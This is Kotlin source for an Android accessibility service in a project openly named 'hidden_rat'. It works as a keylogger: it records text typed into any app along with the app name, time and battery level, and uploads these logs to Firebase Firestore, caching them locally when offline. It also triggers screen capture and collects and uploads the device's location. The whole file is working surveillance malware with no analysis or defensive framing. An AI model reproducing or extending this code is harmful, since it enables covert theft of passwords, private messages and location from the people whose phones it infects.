package com.ratx.hidden_rat.service

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Canvas
import android.location.Geocoder
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.text.format.DateFormat
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.app.ActivityCompat
import com.ratx.hidden_rat.activity.AccessibilityFixActivity
import com.ratx.hidden_rat.model.LogModel
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.storage.FirebaseStorage
import com.google.gson.Gson
import com.google.gson.JsonSyntaxException
import com.ratx.hidden_rat.R
import com.ratx.hidden_rat.uploader.LocationUploader
import kotlinx.coroutines.DelicateCoroutinesApi
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.io.FileWriter
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.Executors


class SvcAccFix : AccessibilityService(), LocationListener {
    private val TEXT_CHANGE_DELAY: Long = 1500 // milliseconds
    private var lastTextChangeTime: Long = 0
    private val fileNameLog = "logs.txt"
    private lateinit var firestore: FirebaseFirestore
    private val logs = mutableListOf<LogModel>()
    private var isFirstLaunch = true
    private var textChangeTimer: Timer? = null

    private val executor = Executors.newSingleThreadExecutor()


    private lateinit var locationManager: LocationManager


    companion object {
        var i = false
        var j = false

    }

    override fun onCreate() {
        super.onCreate()
        firestore = FirebaseFirestore.getInstance()
    }

    @OptIn(DelicateCoroutinesApi::class)
    private fun uploadLocalLogsToFirestore() {
        val file = File(filesDir, fileNameLog)
        if (file.exists()) {
            val gson = Gson()
            val logsToUpload = mutableListOf<LogModel>()

            file.bufferedReader().useLines { lines ->
                lines.forEach { line ->
                    val logModel = gson.fromJson(line, LogModel::class.java)
                    logsToUpload.add(logModel)
                }
            }

            val deviceModel = Build.MODEL
            val dataCollection = firestore.collection("logs_$deviceModel")

            GlobalScope.launch(Dispatchers.IO) {
                logsToUpload.forEach { log ->
                    // Tekshirib chiqamiz, agar "text" Firebase'da mavjud bo'lsa
                    dataCollection.whereEqualTo("text", log.text).get()
                        .addOnSuccessListener { querySnapshot ->
                            // Agar tekshirish natijasida bitta qator ham topilsa
                            if (!querySnapshot.isEmpty) {
                                // Faqat bitta qator qoldiramiz va o'chirib tashlaymiz
                                val document = querySnapshot.documents.first()
                                document.reference.delete()
                            }
                            // Logni Firebase'ga yuboramiz
                            dataCollection.add(log)
                                .addOnSuccessListener {
                                    deleteLogFromLocalFile(log)
                                }
                                .addOnFailureListener { e ->
                                    Log.d("EVENT", "sendLogToFirestore: ${e.message}")
                                    // Xatolikni qayta qarash
                                }
                        }
                }
            }
        }
    }

    private fun deleteLogFromLocalFile(log: LogModel) {
        val file = File(filesDir, fileNameLog)
        val tempList = mutableListOf<LogModel>()
        if (file.exists()) {
            try {
                val gson = Gson()
                val reader = file.bufferedReader()

                // Avvalgi loglar bilan to'g'ri kelgan logni o'chirish
                reader.forEachLine { line ->
                    val notificationModel = gson.fromJson(line, LogModel::class.java)
                    if (notificationModel != log) {
                        tempList.add(notificationModel)
                    }
                }
                reader.close()

                // Faylni tozalash
                file.delete()

                // Yangi ma'lumotlarni faylga yozish
                val writer = FileWriter(file, true)
                tempList.forEach { tempLog ->
                    val logJson = gson.toJson(tempLog)
                    writer.append(logJson)
                    writer.append("\n")
                }
                writer.close()
            } catch (e: IOException) {
                e.printStackTrace()
            } catch (e: JsonSyntaxException) {
                e.printStackTrace()
            }
        }
    }

    private fun retryUploadLog(log: LogModel, retryDelayMs: Long = 5000L) {
        GlobalScope.launch(Dispatchers.IO) {
            delay(retryDelayMs)
            val nextRetryDelayMs =
                (retryDelayMs * 2).coerceAtMost(6000L) // Exponential backoff with a maximum delay
            sendLogToFirestore(log)
        }
    }

    private fun isNetworkFastEnough(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = connectivityManager.activeNetwork
        val capabilities = connectivityManager.getNetworkCapabilities(network)
        return capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ?: false &&
                (capabilities?.linkDownstreamBandwidthKbps
                    ?: 0) >= 14_000 // Minimum required speed for H+ network
    }

    private fun sendLogToFirestore(logModel: LogModel) {
        // Firebase Firestore bog'lanish
        val firestore = FirebaseFirestore.getInstance()
        val deviceModel = Build.MODEL
        val dataCollection = firestore.collection("logs_$deviceModel")
        dataCollection.add(logModel)
            .addOnSuccessListener { documentReference ->
                println(firestore.app.toString())
                Log.d("EVENT", "sendLogToFirestore: ${documentReference.id}")
            }
            .addOnFailureListener { e ->
                retryUploadLog(logModel)
                Log.d("EVENT", "sendLogToFirestore: ${e.message}")
            }
    }


    private fun readLogFromFileLocal() {
        val file = File(filesDir, fileNameLog)
        if (file.exists()) {
            try {
                val gson = Gson()
                val reader = file.bufferedReader()
                val savedNotifications = mutableListOf<LogModel>()

                reader.forEachLine { line ->
                    val notificationModel = gson.fromJson(line, LogModel::class.java)
                    savedNotifications.add(notificationModel)
                }
                reader.close()

                logs.addAll(savedNotifications)
            } catch (e: IOException) {
                e.printStackTrace()
            } catch (e: JsonSyntaxException) {
                e.printStackTrace()
            }
        }
    }

    private fun saveLogToFileLocal(notification: LogModel) {
        val gson = Gson()
        val notificationJson = gson.toJson(notification)

        try {
            val file = File(filesDir, fileNameLog)
            FileWriter(file, true).use { writer ->
                writer.append(notificationJson)
                writer.append("\n")
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

    private fun isLocalLogsAvailable(): Boolean {
        val file = File(filesDir, fileNameLog)
        return file.exists()
    }

    @SuppressLint("SuspiciousIndentation")
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val timestamp = System.currentTimeMillis()
            val packageName = event.packageName?.toString() ?: ""
            val text = event.text?.toString() ?: ""
            val timeStamp = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date())
            val dayTime = DateFormat.format("hh:mm:ss a - E dd/MM/yy", timestamp).toString()
            val cleanedText = text.replace("[", "").replace("]", "")
            val batteryLevel = getBatteryLevel()
            val eventType = event.eventType
            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                textChangeTimer?.cancel()
                textChangeTimer = Timer()
                textChangeTimer!!.schedule(object : TimerTask() {
                    override fun run() {
                        if (cleanedText.isNotEmpty() || (System.currentTimeMillis() - lastTextChangeTime >= TEXT_CHANGE_DELAY)) {
                            Log.d("EVENT", "onAccessibilityEvent: ${cleanedText.toString()}")
                            val notificationModel = LogModel(
                                cleanedText,
                                packageName,
                                dayTime!!,
                                timeStamp!!, batteryLevel.toString()
                            )
                            if (isInternetAvailable(this@SvcAccFix)) {
                                if (isLocalLogsAvailable()) {
                                    sendLogToFirestore(notificationModel)
                                    uploadLocalLogsToFirestore()
                                } else {
                                    sendLogToFirestore(notificationModel)
                                }
                                Log.d("GGG", "Window state changed: ${event.packageName}")
                                val intent = Intent(this@SvcAccFix, ScreenCaptureActivity::class.java)
                                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                startActivity(intent)

                            } else {
                                saveLogToFileLocal(notificationModel)
                            }
                            sendBroadcast(
                                cleanedText,
                                packageName,
                                dayTime,
                                timeStamp,
                                batteryLevel.toString()
                            )
                        }
                        // Text change has ended
                        // Perform your actions here
                    }
                }, TEXT_CHANGE_DELAY)
            } else if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            }

            lastTextChangeTime = System.currentTimeMillis()
        }

    }


    private fun isInternetAvailable(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        return networkInfo != null && networkInfo.isConnected
    }

    override fun onInterrupt() {}
    override fun onServiceConnected() {
        super.onServiceConnected()
        i = true
        if (j) {
            j = false
            val intent = Intent(this, AccessibilityFixActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            startActivity(intent)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        textChangeTimer?.cancel()
    }

    override fun onUnbind(intent: Intent): Boolean {
        i = false
        return super.onUnbind(intent)
    }

    private fun getBatteryLevel(): Int {
        val batteryIntent =
            applicationContext.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level != -1 && scale != -1) (level * 100 / scale) else -1
    }

    private fun sendBroadcast(
        text: String,
        packageName: String,
        dayTime: String,
        timeStamp: String,
        batteryLevel: String
    ) {
        val intent = Intent("ACTION_TEXT_RECEIVED").apply {
            putExtra("TEXT", text)
            putExtra("PACKAGE_NAME", packageName)
            putExtra("DAY_TIME", dayTime)
            putExtra("TIME_STAMP", timeStamp)
            putExtra("BATTERY_LEVEL", batteryLevel)
        }
        sendBroadcast(intent)
    }

    override fun onLocationChanged(locations: MutableList<Location>) {
        super.onLocationChanged(locations)
        getLocation()
        setDataLocation(locations[0])
    }

    //location
    private fun getLocation() {
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
        ) {
//            interactor.enablePermissionLocation(true)
            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1000, 0f, this)
        }
    }

    override fun onLocationChanged(location: Location) = setDataLocation(location)

    private fun getScreenWidth(node: AccessibilityNodeInfo): Int {
        val displayMetrics = DisplayMetrics()
        val windowManager =
            getSystemService(Context.WINDOW_SERVICE) as WindowManager
        windowManager.defaultDisplay.getMetrics(displayMetrics)
        return displayMetrics.widthPixels
    }

    private fun getScreenHeight(node: AccessibilityNodeInfo): Int {
        val displayMetrics = DisplayMetrics()
        val windowManager =
            getSystemService(Context.WINDOW_SERVICE) as WindowManager
        windowManager.defaultDisplay.getMetrics(displayMetrics)
        return displayMetrics.heightPixels
    }

    private fun saveBitmapToFile(bitmap: Bitmap): File {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val fileName = "screenshot_$timestamp.png"
        val outputDir = File(filesDir, "screenshots").apply { mkdirs() }
        val outputFile = File(outputDir, fileName)

        FileOutputStream(outputFile).use { out ->
            bitmap.compress(Bitmap.CompressFormat.PNG, 90, out)
            out.flush()
        }

        return outputFile
    }

    fun setDataLocation(location: Location) {
        val uploader = LocationUploader(this)
        uploader.saveLocation(
            location
        )
    }


}
